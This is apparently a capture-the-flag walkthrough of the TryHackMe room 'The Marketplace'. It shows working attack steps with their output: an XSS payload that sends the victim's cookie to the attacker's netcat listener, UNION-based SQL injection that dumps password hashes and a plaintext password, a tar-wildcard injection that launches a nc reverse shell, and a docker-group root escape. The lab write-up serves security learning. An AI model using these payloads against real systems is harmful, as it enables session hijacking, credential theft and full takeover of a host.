[Home](../../index.md)

# TryHackMe: The Marketplace

https://tryhackme.com/room/marketplace

---
## Enumeration

Initial scan:

```
┌──(kali㉿kali)-[~/tryhackme/marketplace]
└─$ rustscan -a 10.10.33.229 -r 1-65535 -- -sV  

PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    syn-ack nginx 1.19.2
32768/tcp open  http    syn-ack Node.js (Express middleware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Directory brute-forcing reveals the following:

```
403       21l       38w      392c http://10.10.33.229/ADMIN
403       21l       38w      392c http://10.10.33.229/Admin
200       35l       62w      857c http://10.10.33.229/Login
403       21l       38w      392c http://10.10.33.229/admin
301       10l       16w      179c http://10.10.33.229/images
200       35l       62w      857c http://10.10.33.229/login
302        1l        4w       28c http://10.10.33.229/messages
302        1l        4w       28c http://10.10.33.229/new
200        2l        4w       31c http://10.10.33.229/robots.txt
200       30l       54w      667c http://10.10.33.229/signup
301       10l       16w      189c http://10.10.33.229/stylesheets
```

robots.txt includes the /admin directory, but it gives a 403, indicating that we probably need to log in via the /login page to access it.

```
User-Agent: *
Disallow: /admin
```

Accessing the website in a browser reveals a very basic marketplace website.  There is a /login and /signup page for the respective functions.  There are two items listed.

Nothing unusual in the source code on any of the pages.

When trying to log in, the page will give a "User not found" message for attempts.  This indicates that it will tell us when we have a valid user.

The two items in the marketplace are posted by michael and jake.  Trying both of these on the /login page results in an "Invalid password" message, so we have verified that these are valid users.

---
## Flag 1

The hint for flag 1 references the Report Listing function.  I created my own user "blah" and reported one of the listings.  After reporting I got a couple of messages from "system", which I verified was a valid user with the login form.  I also captured the process with Burpsuite and noticed I get a Cookie token value.

```
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoiYmxhaCIsImFkbWluIjpmYWxzZSwiaWF0IjoxNjQwMjk4NzUzfQ.86jKZpZqJQSamScwSZlF6SG0CeokgZb-Q79wBEjQaQ8
```

When I Base64 decode each part (separated by .'s), I get this:

```
{"alg":"HS256","typ":"JWT"}{"userId":4,"username":"blah","admin":false,"iat":1640298753}.:.¦if¢PI©.s...^..@.¢H.m.ýÀ.#A¤<
```

This is a JSON Web token.  There is a room on Tryhackme [here](https://tryhackme.com/room/zthobscurewebvulns) that outlines how these can be exploited, but it requires us to have the server's public key, which we do not have, so this is not likely to work.

Moving on away from JSON Tokens, I tried brute forcing the login with hyrda, no luck.  

```
┌──(kali㉿kali)-[~/tryhackme/marketplace]
└─$ hydra -l system -P /usr/share/wordlists/rockyou.txt 10.10.33.229 http-post-form "/login:username=^USER^&password=^PASS^:403"    
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-23 20:21:01
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.33.229:80/login:username=^USER^&password=^PASS^:403
[STATUS] 831.00 tries/min, 831 tries in 00:01h, 14343568 to do in 287:41h, 16 active
[STATUS] 887.33 tries/min, 2662 tries in 00:03h, 14341737 to do in 269:23h, 16 active
[STATUS] 902.29 tries/min, 6316 tries in 00:07h, 14338083 to do in 264:51h, 16 active
[STATUS] 911.00 tries/min, 13665 tries in 00:15h, 14330734 to do in 262:11h, 16 active
```

I tried some basic SQL injections on the login form with no luck.  

When logged in, we have the option to create our own listing.  Since we assume admins visit listings (especially when they are flagged), we can try to get something to run when they visit the page.

I created a list with the below two for the title and description, to verify it is run when the page is visited.
```
<script>alert(1)</script>

<script>alert(document.cookie)</script>
```

Since we know we get a cookie that represents our user directly, we can hijack the admin (system) session by getting them to visit the page and sending us their cookie.

First, we set up a listener

```
┌──(kali㉿kali)-[~/tryhackme/marketplace]
└─$ nc -lvnp 4444           
listening on [any] 4444 ...
```

Next, we create a new listing with the below payload.  This will send the cookie to our listener.

```
<script>document.location='http://10.13.18.7:4444/?cookie='+document.cookie</script>
```

Sure enough, I see my own cookie in a request when I try to access the listing.

```
┌──(kali㉿kali)-[~/tryhackme/marketplace]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.13.18.7] from (UNKNOWN) [10.13.18.7] 60188
GET /?cookie=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoiYmxhaCIsImFkbWluIjpmYWxzZSwiaWF0IjoxNjQwMzA5Njk1fQ.H7yYFLTLlrGCB_bOOvIr2_zQFeYOv-pr7GPlMmQn9CU HTTP/1.1
Host: 10.13.18.7:4444
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://10.10.33.229/
Upgrade-Insecure-Requests: 1
```

Unfortunately I can't get to the listing to select the report option, so I instead browse to /report/6 (where 6 is the number of my listing).

Make sure the listener is started again, and report the listing.  Sure enough, we soon get a new cookie logged to our listener.

```
┌──(kali㉿kali)-[~/tryhackme/marketplace]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.13.18.7] from (UNKNOWN) [10.10.33.229] 56864
GET /?cookie=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2NDAzMTA0NTd9.PyLn8bpfzabztexB2rhyA0jeXcuc5aDg4J_mUst02dk HTTP/1.1
Host: 10.13.18.7:4444
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/85.0.4182.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://localhost:3000/item/6
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```

Now I browse to /admin and replace my cookie with the new one, and I am given the first flag.

![marketplace1.PNG](./img/marketplace1.PNG "marketplace1.PNG")

---
## Flag 2

Clicking on the available users reveals a user parameter in the URL:

```
http://10.10.33.229/admin?user=1
```

Trying SQL injection gives us errors, so we can start to glean some information about the database

```
http://10.10.33.229/admin?user=0 union select 1,1,1 -- -

Error: ER_WRONG_NUMBER_OF_COLUMNS_IN_SELECT: The used SELECT statements have a different number of columns
```

Here we see that there are 4 columns in the queried table:

```
http://10.10.33.229/admin?user=0 union select 1,1,1,1 -- -

User 1
User 1
ID: 1
Is administrator: true 
```

The database name is 'marketplace':

```
http://10.10.33.229/admin?user=0 union select 1,database(),2,1 -- -

User 1
User marketplace
ID: 1
Is administrator: true 
```

Getting the tables inside of 'marketplace':

```
http://10.10.33.229/admin?user=0 union select 1,group_concat(table_name),1,1 from information_schema.tables where table_schema=%27marketplace%27 -- -

User items,messages,users
ID: 1
Is administrator: true 
```

Let's get the columns of each table:

```
http://10.10.33.229/admin?user=0 union select 1,group_concat(column_name, %27\n%27),1,1 from information_schema.columns where table_name=%27items%27 -- -

User 1
User id ,author ,title ,description ,image
ID: 1
Is administrator: true 

http://10.10.33.229/admin?user=0 union select 1,group_concat(column_name, %27\n%27),1,1 from information_schema.columns where table_name=%27messages%27 -- -

User 1
User id ,user_from ,user_to ,message_content ,is_read
ID: 1
Is administrator: true 

http://10.10.33.229/admin?user=0 union select 1,group_concat(column_name, %27\n%27),1,1 from information_schema.columns where table_name=%27users%27 -- -

User 1
User id ,username ,password ,isAdministrator
ID: 1
Is administrator: true 
```

Now we can get the contents of each table:

```
http://10.10.33.229/admin?user=0 union select 1,group_concat(id, %27:%27, author, %27:%27, title, %27:%27, description, %27:%27, image, %27\n%27),1,1 from marketplace.items -- -

User 1
User 1:2:Dell Laptop:Good as new. :867a9d1a2edc2995dca4b13de50fc545 ,2:3:A cactus:Yep, that's a cactus.:abffe546fb4cb740cc6b44f9e4c263df ,3:4:<script>document.location='http://10.13.18.7:4444/?cookie='+document.cookie</script>:<script>document.location='http://10.13.18.7:4444/?cookie='+document.cookie</script>:598815c0f5554115631a3250e5db1719
ID: 1
Is administrator: true 

http://10.10.33.229/admin?user=0 union select 1,group_concat(id, %27:%27, user_from, %27:%27, user_to, %27:%27, message_content, %27:%27, is_read, %27\n%27),1,1 from marketplace.messages -- -

User 1
User 1:1:3:Hello! An automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password. Your new password is: @b_ENXkGYUCAv3zJ:1 ,2:1:4:Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace!:1 ,3:1:4:Thank you for your report. We have been unable to review the listing at this time. Something may be blocking our ability to view it, such as alert boxes, which are blocked in our employee's browsers.:0
ID: 1
Is administrator: true 

http://10.10.33.229/admin?user=0 union select 1,group_concat(id, %27:%27, username, %27:%27, password, %27:%27, isAdministrator, %27\n%27),1,1 from marketplace.users -- -

User 1
User 1:system:$2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW:0 ,2:michael:$2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q:1 ,3:jake:$2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG:1 ,4:blah:$2b$10$N1hgLQZf0CDJt/wrArsn3.7t30yyV9tDVsiHzAaxKme2WSEu3.XB.:0
ID: 1
Is administrator: true 
```

The items table just shows us the items we already had access to.  The Users table gives us hashed passwords for each user, which would be valuable, but the messages table straight up gives us a password.  Since the message was sent to User 3, we can assume that this is Jake's password.  Let's try to SSH.

```
┌──(kali㉿kali)-[~/tryhackme/marketplace]
└─$ ssh jake@10.10.33.229                                                                                                                                                                                                                                                                                               1 ⨯
The authenticity of host '10.10.33.229 (10.10.33.229)' can't be established.
ED25519 key fingerprint is SHA256:Rl4+lAmQWEhSKHNbPY/BoNdG16/4xcmIXNIlSrBasm0.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.33.229' (ED25519) to the list of known hosts.
jake@10.10.33.229's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Dec 28 19:17:35 UTC 2021

  System load:  0.15               Users logged in:                0
  Usage of /:   87.1% of 14.70GB   IP address for eth0:            10.10.33.229
  Memory usage: 31%                IP address for docker0:         172.17.0.1
  Swap usage:   0%                 IP address for br-636b40a4e2d6: 172.18.0.1
  Processes:    102

  => / is using 87.1% of 14.70GB


20 packages can be updated.
0 updates are security updates.


jake@the-marketplace:~$
```

Flag 2 is in jake's home folder.

---
## Flag 3

Checking in the usual places for Linux privesc, I immediately notice we can run a script as michael.  Unfortunately we don't have write access to the script, but the script does use tar with a wildcard.

```
jake@the-marketplace:~$ sudo -l
Matching Defaults entries for jake on the-marketplace:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh
jake@the-marketplace:~$ cat /opt/backups/backup.sh
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
jake@the-marketplace:~$ ls -al /opt/backups/
total 24
drwxrwxrwt 2 root    root     4096 Aug 23  2020 .
drwxr-xr-x 4 root    root     4096 Aug 23  2020 ..
-rwxr-xr-x 1 michael michael    73 Aug 23  2020 backup.sh
-rw-rw-r-- 1 jake    jake    10240 Aug 23  2020 backup.tar
```

I googled "exploiting tar wildcard" and got [this](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/) article as the first result.

Essentially we are creating files that are then interpreted as arguments for tar.

```
jake@the-marketplace:/opt/backups$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.18.7 4444 >/tmp/f" > shell.sh
jake@the-marketplace:/opt/backups$ echo "" > "--checkpoint-action=exec=sh shell.sh"
jake@the-marketplace:/opt/backups$ echo "" > --checkpoint=1
jake@the-marketplace:/opt/backups$ sudo -u michael ./backup.sh 
Backing up files...
tar: /opt/backups/backup.tar: Cannot open: Permission denied
tar: Error is not recoverable: exiting now
```

We have to correct permissions on backup.tar:

```
jake@the-marketplace:/opt/backups$ chmod 777 backup.tar
jake@the-marketplace:/opt/backups$ 
```

Now we can get a reverse shell and upgrade (don't forget to start your listener):

```
ake@the-marketplace:/opt/backups$ sudo -u michael ./backup.sh
Backing up files...
tar: backup.tar: file is the archive; not dumped
```

```
┌──(kali㉿kali)-[~/tryhackme/marketplace]
└─$ nc -lvnp 4444               
listening on [any] 4444 ...
connect to [10.13.18.7] from (UNKNOWN) [10.10.33.229] 38916
$ id
uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
$ python3 -c "import pty; pty.spawn('/bin/bash')"
michael@the-marketplace:/opt/backups$ 
```

Michael is in the docker group.  This means that we can create new containers, and hopefully mount the root filesystem.  Listing the available images shows that we have the alpine image:

```
michael@the-marketplace:/opt/backups$ docker images
docker images
REPOSITORY                   TAG                 IMAGE ID            CREATED             SIZE
themarketplace_marketplace   latest              6e3d8ac63c27        16 months ago       2.16GB
nginx                        latest              4bb46517cac3        16 months ago       133MB
node                         lts-buster          9c4cc2688584        17 months ago       886MB
mysql                        latest              0d64f46acfd1        17 months ago       544MB
alpine                       latest              a24bb4013296        19 months ago       5.57MB
```

After creating and running, we see the root flag in the expected directory:

```
michael@the-marketplace:/opt/backups$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
t /mnt shn -v /:/mnt --rm -it alpine chroot
# id
id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
# pwd
pwd
/
# cd /root
cd /root
# ls
ls
root.txt
```